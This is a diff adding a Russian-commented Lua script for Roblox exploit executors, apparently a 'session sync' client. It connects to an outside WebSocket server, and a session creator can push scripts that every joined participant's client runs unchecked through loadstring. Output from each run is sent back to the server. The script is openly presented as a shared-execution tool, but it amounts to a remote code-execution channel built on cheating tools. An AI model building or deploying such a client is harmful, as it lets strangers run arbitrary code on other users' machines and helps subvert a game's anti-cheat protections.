@@ -1,0 +1,457 @@
+-- ========================================
+-- Минимальный Session Sync Client
+-- Только основное: код, присоединиться, создать, вывод, скрытие
+-- ========================================
+
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Переменные состояния
+local ws = nil
+local connected = false
+local currentCode = nil
+local isCreator = false
+
+-- Функция отправки JSON
+function sendToServer(data)
+    if ws and connected then
+        ws:Send(game:GetService("HttpService"):JSONEncode(data))
+    end
+end
+
+-- Подключение к серверу
+function connect()
+    if ws then return true end
+    local success = pcall(function()
+        ws = WebSocket.connect("wss://robloxlocalscriptsync.onrender.com")
+    end)
+    if not success then
+        pcall(function()
+            ws = syn.websocket.connect("wss://robloxlocalscriptsync.onrender.com")
+        end)
+    end
+    if not ws then
+        warn("Не удалось подключиться")
+        return false
+    end
+    connected = true
+    ws.OnMessage:Connect(function(msg)
+        local data = game:GetService("HttpService"):JSONDecode(msg)
+        handleMessage(data)
+    end)
+    sendToServer({ type = "identify", name = player.Name })
+    return true
+end
+
+-- Обработчик сообщений
+function handleMessage(data)
+    if data.type == "created" then
+        currentCode = data.code
+        isCreator = true
+        showSessionWindow()
+    elseif data.type == "joined" then
+        currentCode = data.code
+        isCreator = false
+        showSessionWindow()
+    elseif data.type == "exec" then
+        executeScript(data.script)
+    elseif data.type == "output" then
+        addOutput(data.message)
+    elseif data.type == "error" then
+        showError(data.message)
+    elseif data.type == "left" then
+        currentCode = nil
+        isCreator = false
+        closeSessionWindow()
+        showMainWindow()
+    elseif data.type == "session_closed" then
+        currentCode = nil
+        isCreator = false
+        closeSessionWindow()
+        showMainWindow()
+        showError("Сессия закрыта создателем")
+    elseif data.type == "exec_sent" then
+        -- не выводим ничего, просто игнорируем
+    end
+end
+
+-- ==================== ГЛАВНОЕ ОКНО ====================
+local mainFrame = nil
+local mainVisible = true
+
+function createMainWindow()
+    if mainFrame then mainFrame:Destroy() end
+    mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 300, 0, 160)   -- маленькое окно
+    mainFrame.Position = UDim2.new(0.5, -150, 0.4, -80)
+    mainFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+    mainFrame.BackgroundTransparency = 0.1
+    mainFrame.Parent = gui
+    makeDraggable(mainFrame)
+
+    -- Заголовок
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 25)
+    title.BackgroundTransparency = 1
+    title.Text = "Вход в сессию"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.TextScaled = true
+    title.Font = Enum.Font.SourceSansBold
+    title.Parent = mainFrame
+
+    -- Поле ввода кода
+    local codeBox = Instance.new("TextBox")
+    codeBox.Size = UDim2.new(0, 100, 0, 30)
+    codeBox.Position = UDim2.new(0, 10, 0, 35)
+    codeBox.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    codeBox.TextColor3 = Color3.new(1, 1, 1)
+    codeBox.Text = ""
+    codeBox.PlaceholderText = "Код"
+    codeBox.Font = Enum.Font.SourceSans
+    codeBox.TextSize = 18
+    codeBox.MaxLength = 5
+    codeBox.Parent = mainFrame
+
+    -- Кнопка "Присоединиться"
+    local joinBtn = Instance.new("TextButton")
+    joinBtn.Size = UDim2.new(0, 80, 0, 30)
+    joinBtn.Position = UDim2.new(0, 120, 0, 35)
+    joinBtn.BackgroundColor3 = Color3.new(0.2, 0.6, 0.2)
+    joinBtn.Text = "Войти"
+    joinBtn.TextColor3 = Color3.new(1, 1, 1)
+    joinBtn.TextScaled = true
+    joinBtn.Font = Enum.Font.SourceSansBold
+    joinBtn.Parent = mainFrame
+    joinBtn.MouseButton1Click:Connect(function()
+        local code = codeBox.Text:gsub("%s+", "")
+        if #code == 5 then
+            sendToServer({ type = "join", code = code })
+        else
+            showError("Код должен быть 5 символов")
+        end
+    end)
+
+    -- Кнопка "Создать"
+    local createBtn = Instance.new("TextButton")
+    createBtn.Size = UDim2.new(0, 80, 0, 30)
+    createBtn.Position = UDim2.new(0, 210, 0, 35)
+    createBtn.BackgroundColor3 = Color3.new(0.2, 0.4, 0.8)
+    createBtn.Text = "Создать"
+    createBtn.TextColor3 = Color3.new(1, 1, 1)
+    createBtn.TextScaled = true
+    createBtn.Font = Enum.Font.SourceSansBold
+    createBtn.Parent = mainFrame
+    createBtn.MouseButton1Click:Connect(function()
+        sendToServer({ type = "create" })
+    end)
+
+    -- Кнопка "Скрыть" (сворачивает главное окно)
+    local hideBtn = Instance.new("TextButton")
+    hideBtn.Size = UDim2.new(0, 30, 0, 25)
+    hideBtn.Position = UDim2.new(1, -35, 0, 0)
+    hideBtn.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
+    hideBtn.Text = "—"
+    hideBtn.TextColor3 = Color3.new(1, 1, 1)
+    hideBtn.TextScaled = true
+    hideBtn.Font = Enum.Font.SourceSansBold
+    hideBtn.Parent = mainFrame
+    hideBtn.MouseButton1Click:Connect(function()
+        mainFrame.Visible = false
+        mainVisible = false
+        showRestoreButton()
+    end)
+
+    return mainFrame
+end
+
+-- ==================== ОКНО СЕССИИ ====================
+local sessionFrame = nil
+local sessionVisible = true
+local outputLabel = nil
+local outputFrame = nil
+local scriptBox = nil
+local execBtn = nil
+
+function createSessionWindow()
+    if sessionFrame then sessionFrame:Destroy() end
+    sessionFrame = Instance.new("Frame")
+    sessionFrame.Size = UDim2.new(0, 350, 0, 250)
+    sessionFrame.Position = UDim2.new(0.5, -175, 0.3, -125)
+    sessionFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+    sessionFrame.BackgroundTransparency = 0.1
+    sessionFrame.Parent = gui
+    makeDraggable(sessionFrame)
+
+    -- Заголовок с кодом сессии
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 25)
+    title.BackgroundTransparency = 1
+    title.Text = "Сессия: " .. (currentCode or "???")
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.TextScaled = true
+    title.Font = Enum.Font.SourceSansBold
+    title.Parent = sessionFrame
+
+    -- Кнопка закрыть (крестик)
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 25, 0, 25)
+    closeBtn.Position = UDim2.new(1, -30, 0, 0)
+    closeBtn.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+    closeBtn.Text = "✕"
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.TextScaled = true
+    closeBtn.Font = Enum.Font.SourceSansBold
+    closeBtn.Parent = sessionFrame
+    closeBtn.MouseButton1Click:Connect(function()
+        -- Закрываем окно и выходим из сессии (или закрываем сессию, если создатель)
+        if isCreator then
+            sendToServer({ type = "close" })  -- закрываем сессию для всех
+        else
+            sendToServer({ type = "leave" })
+        end
+        -- Окно закроется после ответа сервера (left или session_closed)
+        -- Но чтобы не ждать, сразу скроем
+        sessionFrame.Visible = false
+        sessionVisible = false
+        showRestoreButton()
+    end)
+
+    -- Поле вывода (ScrollingFrame + TextLabel)
+    outputFrame = Instance.new("ScrollingFrame")
+    outputFrame.Size = UDim2.new(1, -10, 0, 150)
+    outputFrame.Position = UDim2.new(0, 5, 0, 30)
+    outputFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+    outputFrame.BackgroundTransparency = 0.5
+    outputFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    outputFrame.ScrollBarThickness = 4
+    outputFrame.Parent = sessionFrame
+
+    outputLabel = Instance.new("TextLabel")
+    outputLabel.Size = UDim2.new(1, 0, 0, 0)
+    outputLabel.BackgroundTransparency = 1
+    outputLabel.TextColor3 = Color3.new(1, 1, 1)
+    outputLabel.Text = ""
+    outputLabel.TextWrapped = true
+    outputLabel.TextXAlignment = Enum.TextXAlignment.Left
+    outputLabel.TextYAlignment = Enum.TextYAlignment.Top
+    outputLabel.Font = Enum.Font.Code
+    outputLabel.TextSize = 12
+    outputLabel.Parent = outputFrame
+
+    -- Если создатель, добавляем поле для ввода скрипта и кнопку "Выполнить"
+    if isCreator then
+        scriptBox = Instance.new("TextBox")
+        scriptBox.Size = UDim2.new(1, -10, 0, 40)
+        scriptBox.Position = UDim2.new(0, 5, 0, 190)
+        scriptBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+        scriptBox.TextColor3 = Color3.new(1, 1, 1)
+        scriptBox.Text = ""
+        scriptBox.PlaceholderText = "Введите скрипт..."
+        scriptBox.Font = Enum.Font.Code
+        scriptBox.TextSize = 14
+        scriptBox.MultiLine = false
+        scriptBox.ClearTextOnFocus = false
+        scriptBox.Parent = sessionFrame
+
+        execBtn = Instance.new("TextButton")
+        execBtn.Size = UDim2.new(0, 80, 0, 30)
+        execBtn.Position = UDim2.new(1, -90, 0, 195)
+        execBtn.BackgroundColor3 = Color3.new(0.2, 0.6, 0.2)
+        execBtn.Text = "Выполнить"
+        execBtn.TextColor3 = Color3.new(1, 1, 1)
+        execBtn.TextScaled = true
+        execBtn.Font = Enum.Font.SourceSansBold
+        execBtn.Parent = sessionFrame
+        execBtn.MouseButton1Click:Connect(function()
+            local scriptText = scriptBox.Text
+            if scriptText and #scriptText > 0 then
+                sendToServer({ type = "exec", script = scriptText })
+                scriptBox.Text = ""
+            else
+                showError("Введите скрипт")
+            end
+        end)
+    else
+        -- Для участников просто показываем вывод и кнопку "Выйти"
+        local leaveBtn = Instance.new("TextButton")
+        leaveBtn.Size = UDim2.new(0, 80, 0, 30)
+        leaveBtn.Position = UDim2.new(0.5, -40, 0, 195)
+        leaveBtn.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+        leaveBtn.Text = "Выйти"
+        leaveBtn.TextColor3 = Color3.new(1, 1, 1)
+        leaveBtn.TextScaled = true
+        leaveBtn.Font = Enum.Font.SourceSansBold
+        leaveBtn.Parent = sessionFrame
+        leaveBtn.MouseButton1Click:Connect(function()
+            sendToServer({ type = "leave" })
+            sessionFrame.Visible = false
+            sessionVisible = false
+            showRestoreButton()
+        end)
+    end
+
+    return sessionFrame
+end
+
+-- ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
+
+-- Функция для перетаскивания
+function makeDraggable(frame)
+    local dragging = false
+    local dragStartX, dragStartY
+    local startPosX, startPosY
+
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStartX = input.Position.X
+            dragStartY = input.Position.Y
+            startPosX = frame.Position.X.Offset
+            startPosY = frame.Position.Y.Offset
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    frame.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
+            local deltaX = input.Position.X - dragStartX
+            local deltaY = input.Position.Y - dragStartY
+            frame.Position = UDim2.new(0, startPosX + deltaX, 0, startPosY + deltaY)
+        end
+    end)
+end
+
+-- Кнопка восстановления (если окно скрыто)
+local restoreBtn = nil
+
+function showRestoreButton()
+    if restoreBtn then return end
+    restoreBtn = Instance.new("TextButton")
+    restoreBtn.Size = UDim2.new(0, 40, 0, 40)
+    restoreBtn.Position = UDim2.new(0.02, 0, 0.02, 0)
+    restoreBtn.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
+    restoreBtn.Text = "+"
+    restoreBtn.TextColor3 = Color3.new(1, 1, 1)
+    restoreBtn.TextScaled = true
+    restoreBtn.Font = Enum.Font.SourceSansBold
+    restoreBtn.Parent = gui
+    makeDraggable(restoreBtn)
+    restoreBtn.MouseButton1Click:Connect(function()
+        -- Восстанавливаем то окно, которое было скрыто
+        if sessionFrame and not sessionFrame.Visible then
+            sessionFrame.Visible = true
+            sessionVisible = true
+        elseif mainFrame and not mainFrame.Visible then
+            mainFrame.Visible = true
+            mainVisible = true
+        end
+        restoreBtn:Destroy()
+        restoreBtn = nil
+    end)
+end
+
+function showMainWindow()
+    if not mainFrame then
+        createMainWindow()
+    else
+        mainFrame.Visible = true
+        mainVisible = true
+    end
+    if restoreBtn then
+        restoreBtn:Destroy()
+        restoreBtn = nil
+    end
+end
+
+function showSessionWindow()
+    if mainFrame then
+        mainFrame.Visible = false
+        mainVisible = false
+    end
+    if not sessionFrame then
+        createSessionWindow()
+    else
+        sessionFrame.Visible = true
+        sessionVisible = true
+    end
+    if restoreBtn then
+        restoreBtn:Destroy()
+        restoreBtn = nil
+    end
+end
+
+function closeSessionWindow()
+    if sessionFrame then
+        sessionFrame:Destroy()
+        sessionFrame = nil
+    end
+    sessionVisible = false
+end
+
+function addOutput(message)
+    if not sessionFrame or not outputLabel then return end
+    local current = outputLabel.Text
+    if #current > 0 then
+        current = current .. "\n"
+    end
+    current = current .. message
+    outputLabel.Text = current
+    if outputFrame then
+        outputFrame.CanvasSize = UDim2.new(0, 0, 0, outputLabel.TextBounds.Y + 10)
+        outputFrame.CanvasPosition = Vector2.new(0, outputFrame.CanvasSize.Y.Offset)
+    end
+end
+
+function executeScript(script)
+    local originalPrint = _G.print
+    _G.print = function(...)
+        local args = {...}
+        local str = ""
+        for i, v in ipairs(args) do
+            str = str .. tostring(v)
+            if i < #args then str = str .. " " end
+        end
+        sendToServer({ type = "output", message = str })
+    end
+    local success, err = pcall(function()
+        loadstring(script)()
+    end)
+    _G.print = originalPrint
+    if not success then
+        sendToServer({ type = "output", message = "Ошибка: " .. tostring(err) })
+    end
+end
+
+function showError(message)
+    local notif = Instance.new("TextLabel")
+    notif.Size = UDim2.new(0, 300, 0, 30)
+    notif.Position = UDim2.new(0.5, -150, 0.02, 0)
+    notif.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+    notif.TextColor3 = Color3.new(1, 1, 1)
+    notif.Text = message
+    notif.TextScaled = true
+    notif.Font = Enum.Font.SourceSansBold
+    notif.Parent = gui
+    game:GetService("Debris"):AddItem(notif, 3)
+end
+
+-- ==================== ЗАПУСК ====================
+connect()
+showMainWindow()
+
+-- Если персонаж ресетнулся, закрываем сессию, если не в persist (но мы не используем persist в этой версии, так что просто выходим)
+player.CharacterAdded:Connect(function()
+    if currentCode then
+        sendToServer({ type = "leave" })
+        currentCode = nil
+        isCreator = false
+        closeSessionWindow()
+        showMainWindow()
+        showError("Вы отключены (респавн)")
+    end
+end)
